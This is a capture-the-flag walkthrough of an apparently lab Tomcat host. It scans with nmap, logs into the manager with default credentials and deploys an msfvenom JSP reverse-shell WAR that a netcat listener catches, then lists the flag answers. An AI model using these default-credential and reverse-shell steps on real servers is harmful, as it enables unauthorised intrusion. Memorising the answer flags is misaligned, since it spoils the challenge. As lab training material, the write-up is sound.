
Task 1 : Which TCP port is open on the remote host?

Run an nmap scan for given IP address

```
sudo nmap -sV -Pn -T4 -oA initial_scan 10.129.136.9
```

<img width="779" height="191" alt="Pasted image 20260216003010" src="https://github.com/user-attachments/assets/e8e84015-0afc-439c-8686-b06f9fe1dd6b" />

Answer : 8080

---

Task 2 : Which web server is running on the remote host? Looking for two words.

![[Pasted image 20260216002941.png]]

Answer : Apache Tomcat

---

Task 3 : Which relative path on the webserver leads to the Web Application Manager?

![[Pasted image 20260216003800.png]]

Answer : /manager/html

---

Task 4 : What is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username:password

Tried some default credentials for Tomcat Apache such as :

admin:admin
administrator:administrator
admin:(none)
tomcat:Tomcatadm

None of them worked.

![[Pasted image 20260216004048.png]]

Upon closer inspection of the error page, a suggested default credential of "tomcat:s3cret" can be seen.

![[Screenshot_2026-02-15_11-41-38.png]]

These credentials work and Tomcat Web Application Manager can be accessed.

Answer : tomcat:s3cret

---

Task 5 : Which file type can be uploaded and deployed on the server using the Tomcat Web Application Manager?

![[Pasted image 20260216004329.png]]

Tomcat Apache allows .war files to be uploaded

Answer : war

---

Task 6 : Submit the flag located on the user's desktop.

Task 7 : Submit the flag located on the administrator's desktop.

Both flags are given together so I will do them simultaneously.

Craft an msfvenom .war reverse shell payload that can be deployed onto the server.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.37 LPORT=4444 -f war > reverse.war
```

![[Pasted image 20260216004825.png]]

Next, open a netcat listener to catch the reverse connection

```
nc -lvnp 4444
```

![[Pasted image 20260216004736.png]]

With the crafted msfvenom payload, browse and deploy the .war file.

![[Pasted image 20260216005025.png]]

![[Pasted image 20260216005045.png]]

Finally, our reverse shell payload is uploaded.

![[Pasted image 20260216005204.png]]

![[Pasted image 20260216005349.png]]

Looking at our attacker machine, our netcat catches a reverse connection.

We achieve a reverse shell connection as nt authority\system

![[Pasted image 20260216005537.png]]

The flag can be found at C:\Users\Administrator\Desktop\flags\

Answer : 

User flag 
```
7004dbcef0f854e0fb401875f26ebd00
```

Root Flag
```
04a8b36e1545a455393d067e772fe90e
```



